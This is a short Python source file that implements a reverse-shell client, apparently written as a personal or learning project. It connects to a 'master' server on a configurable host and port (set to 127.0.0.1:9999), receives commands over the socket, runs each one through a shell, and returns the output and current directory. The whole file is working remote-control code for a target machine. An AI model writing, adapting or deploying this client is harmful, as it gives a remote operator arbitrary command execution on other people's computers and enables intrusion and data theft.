import socket
import os
import subprocess
# control on target machine

def ConnectToMaster():
    global clientSock
    global host
    global port
    clientSock = socket.socket()
    host = '127.0.0.1' #127.0.0.1
    port = 9999
    clientSock.connect((host, port))

def setFormat(data):
    i = str(len(data.encode()))# string of the len of the binary v of data
    if(int(i) > 9999):
        return "### special code ###"
    i = i.zfill(14)
    print(len(str(i).encode()))
    return i + data
# need to encode the return

def ClientLoop():
    output_str = ""
    while True:
        try:
            try:
                dataLen = int((clientSock.recv(14)).decode())
                data = clientSock.recv(dataLen)
            except:
                continue
            if data.decode("utf-8") == 'cd':
                clientSock.send(str.encode(setFormat(str(os.getcwd()))))
                continue
            if (len(data) > 0):
                cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # opening a process. mwanging the I/O
                output_bytes = cmd.stdout.read() + cmd.stderr.read() # the errors and outputs
                output_str = str(output_bytes, "utf-8")
                clientSock.send(str.encode(setFormat(output_str + str(os.getcwd()) + '.')))
                print(output_str)
        except socket.error as msg:
            print("Oh boy")
            print(output_str)
            clientSock.close()
            print(msg)
            break
        except:
            print("Come on")
            clientSock.send(str.encode(setFormat("Eror Occured")))

def main():
    ConnectToMaster()
    ClientLoop()


if __name__ == '__main__':
    main()


